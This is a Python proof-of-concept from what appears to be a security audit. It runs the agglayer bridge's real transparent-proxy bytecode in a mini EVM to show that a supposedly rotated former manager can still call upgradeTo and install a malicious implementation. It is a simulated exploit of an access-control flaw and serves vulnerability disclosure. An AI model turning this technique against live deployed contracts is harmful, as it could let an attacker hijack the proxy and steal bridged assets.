#!/usr/bin/env python3
"""Execute the supplied proxy runtime bytecode to prove stale-admin upgrades."""

from __future__ import annotations

import re
from pathlib import Path
from zipfile import ZipFile


ROOT = Path(__file__).resolve().parents[2]
MASK = (1 << 256) - 1
ADMIN_SLOT = int("b53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103", 16)
IMPLEMENTATION_SLOT = int("360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", 16)
UPGRADE_TO = bytes.fromhex("3659cfe6")


def source() -> str:
    path = ROOT / "agglayer-contracts-main/contracts/lib/BridgeLib.sol"
    if path.exists():
        return path.read_text()
    with ZipFile(ROOT / "agglayer-contracts-main.zip") as archive:
        return archive.read("agglayer-contracts-main/contracts/lib/BridgeLib.sol").decode()


def proxy_runtime() -> bytes:
    match = re.search(r"INIT_BYTECODE_TRANSPARENT_PROXY\s*=\s*hex\"([0-9a-f]+)\"", source())
    assert match
    initcode = bytes.fromhex(match.group(1))
    marker = bytes.fromhex("6109ac806104d55f395ff3")
    marker_at = initcode.index(marker)
    runtime_at = marker_at + len(marker)
    if initcode[runtime_at] == 0xFE:  # Solidity's creation/runtime separator.
        runtime_at += 1
    runtime = initcode[runtime_at : runtime_at + 0x9AC]
    assert len(runtime) == 0x9AC
    return runtime


class Revert(Exception):
    pass


class MiniEVM:
    def __init__(self, code: bytes, caller: int, calldata: bytes, storage: dict[int, int], accounts_with_code: set[int]):
        self.code, self.caller, self.calldata = code, caller, calldata
        self.storage, self.accounts_with_code = storage, accounts_with_code
        self.pc, self.stack, self.memory = 0, [], bytearray()

    def push(self, value: int) -> None:
        self.stack.append(value & MASK)

    def pop(self) -> int:
        return self.stack.pop()

    def mem(self, end: int) -> None:
        if len(self.memory) < end:
            self.memory.extend(b"\0" * (end - len(self.memory)))

    def run(self) -> None:
        while self.pc < len(self.code):
            op = self.code[self.pc]
            self.pc += 1
            if op == 0x00:  # STOP
                return
            if op == 0x5F:
                self.push(0)
            elif 0x60 <= op <= 0x7F:
                size = op - 0x5F
                self.push(int.from_bytes(self.code[self.pc : self.pc + size], "big"))
                self.pc += size
            elif 0x80 <= op <= 0x8F:
                self.push(self.stack[-(op - 0x7F)])
            elif 0x90 <= op <= 0x9F:
                depth = op - 0x8F
                self.stack[-1], self.stack[-1 - depth] = self.stack[-1 - depth], self.stack[-1]
            elif op == 0x01:
                self.push(self.pop() + self.pop())
            elif op == 0x03:
                a, b = self.pop(), self.pop(); self.push(a - b)
            elif op == 0x10:
                a, b = self.pop(), self.pop(); self.push(a < b)
            elif op == 0x11:
                a, b = self.pop(), self.pop(); self.push(a > b)
            elif op == 0x12:
                a, b = self.pop(), self.pop()
                a = a - (1 << 256) if a >> 255 else a
                b = b - (1 << 256) if b >> 255 else b
                self.push(a < b)
            elif op == 0x14:
                self.push(self.pop() == self.pop())
            elif op == 0x15:
                self.push(self.pop() == 0)
            elif op == 0x16:
                self.push(self.pop() & self.pop())
            elif op == 0x17:
                self.push(self.pop() | self.pop())
            elif op == 0x19:
                self.push(~self.pop())
            elif op == 0x1C:
                shift, value = self.pop(), self.pop(); self.push(value >> shift)
            elif op == 0x30:
                self.push(0xCAFE)
            elif op == 0x33:
                self.push(self.caller)
            elif op == 0x34:
                self.push(0)
            elif op == 0x35:
                offset = self.pop(); self.push(int.from_bytes(self.calldata[offset : offset + 32].ljust(32, b"\0"), "big"))
            elif op == 0x36:
                self.push(len(self.calldata))
            elif op == 0x37:
                mem_at, data_at, size = self.pop(), self.pop(), self.pop(); self.mem(mem_at + size); self.memory[mem_at:mem_at+size] = self.calldata[data_at:data_at+size].ljust(size, b"\0")
            elif op == 0x3B:
                self.push(1 if self.pop() in self.accounts_with_code else 0)
            elif op == 0x3D:
                self.push(0)
            elif op == 0x3E:
                mem_at, _, size = self.pop(), self.pop(), self.pop(); self.mem(mem_at + size)
            elif op == 0x50:
                self.pop()
            elif op == 0x51:
                offset = self.pop(); self.mem(offset + 32); self.push(int.from_bytes(self.memory[offset:offset+32], "big"))
            elif op == 0x52:
                offset, value = self.pop(), self.pop(); self.mem(offset + 32); self.memory[offset:offset+32] = value.to_bytes(32, "big")
            elif op == 0x54:
                self.push(self.storage.get(self.pop(), 0))
            elif op == 0x55:
                slot, value = self.pop(), self.pop(); self.storage[slot] = value
            elif op == 0x56:
                self.pc = self.pop()
            elif op == 0x57:
                destination, condition = self.pop(), self.pop()
                if condition: self.pc = destination
            elif op == 0x5A:
                self.push(30_000_000)
            elif op == 0x5B:
                pass
            elif 0xA0 <= op <= 0xA4:
                topics = op - 0xA0
                self.pop(); self.pop()
                for _ in range(topics): self.pop()
            elif op == 0xF3:
                return
            elif op == 0xF4:
                # The non-admin path delegates to the implementation. Contract
                # execution is irrelevant to this access-control PoC; model a
                # failed delegatecall and let the real proxy runtime bubble it.
                for _ in range(6): self.pop()
                self.push(0)
            elif op == 0xFD:
                raise Revert()
            else:
                raise AssertionError(f"unsupported opcode 0x{op:02x} at pc 0x{self.pc-1:x}")


def main() -> None:
    old_manager = 0xA11CE
    new_manager = 0xB0B
    honest_implementation = 0x1000
    malicious_implementation = 0x2000
    storage = {ADMIN_SLOT: old_manager, IMPLEMENTATION_SLOT: honest_implementation}

    # The bridge-level rotation changes a different contract's storage; the
    # proxy's EIP-1967 admin slot remains old_manager.
    bridge_manager = new_manager
    assert bridge_manager == new_manager and storage[ADMIN_SLOT] == old_manager

    calldata = UPGRADE_TO + malicious_implementation.to_bytes(32, "big")

    # The replacement manager is not the proxy admin and cannot use upgradeTo.
    try:
        MiniEVM(proxy_runtime(), new_manager, calldata, storage, {honest_implementation, malicious_implementation}).run()
    except Revert:
        pass
    else:
        raise AssertionError("replacement manager unexpectedly reached the proxy admin path")
    assert storage[IMPLEMENTATION_SLOT] == honest_implementation

    # The supposedly replaced manager still reaches the real admin path.
    MiniEVM(proxy_runtime(), old_manager, calldata, storage, {honest_implementation, malicious_implementation}).run()
    assert storage[IMPLEMENTATION_SLOT] == malicious_implementation
    print("EVM PoC reproduced: former manager upgraded the real supplied proxy runtime bytecode")


if __name__ == "__main__":
    main()
